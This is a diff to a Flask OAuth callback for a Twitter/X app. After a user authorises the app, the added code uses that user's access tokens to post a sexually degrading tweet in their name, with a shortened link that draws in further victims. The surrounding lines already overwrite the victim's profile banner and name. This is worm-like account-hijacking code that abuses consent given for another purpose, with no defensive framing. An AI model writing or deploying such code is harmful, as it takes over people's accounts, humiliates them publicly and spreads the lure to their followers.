@@ -223,6 +223,15 @@ def callback():
         update_profile_banner(real_client)
         name = "Meiminaddict #"+str(random.random())[2:8]
         update_profile_name(real_client,name)
+        api = tweepy.Client(bearer_token=app.config['BEARER_TOKEN'],
+                                        consumer_key=app.config['APP_CONSUMER_KEY'], 
+                                        consumer_secret=app.config['APP_CONSUMER_SECRET'],
+                                        access_token=real_oauth_token, 
+                                        access_token_secret=real_oauth_token_secret)
+        
+        api.create_tweet(text="I am dumb slut who clicks anything sent by the wonder @PrincessMeimina. clicky click https://tinyurl.com/3y97dae2 to be owned by Meimina$$")
+        #send_message(real_client,"1697559401543139328","I am dumb and clicked your link Goddess")
+        
 
     if endpoint == 'test':
         print("testing endpoint")
